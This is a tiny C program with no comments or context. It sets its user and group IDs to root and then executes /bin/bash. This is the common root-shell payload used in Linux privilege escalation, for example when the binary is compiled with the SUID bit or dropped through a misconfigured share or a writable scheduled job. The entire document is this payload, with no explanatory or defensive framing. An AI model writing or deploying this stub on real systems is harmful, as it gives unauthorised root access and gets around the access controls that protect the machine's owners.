int main()
{
setuid(0);
setgid(0);

execl("/bin/bash","bash",0); 
return 0;
}
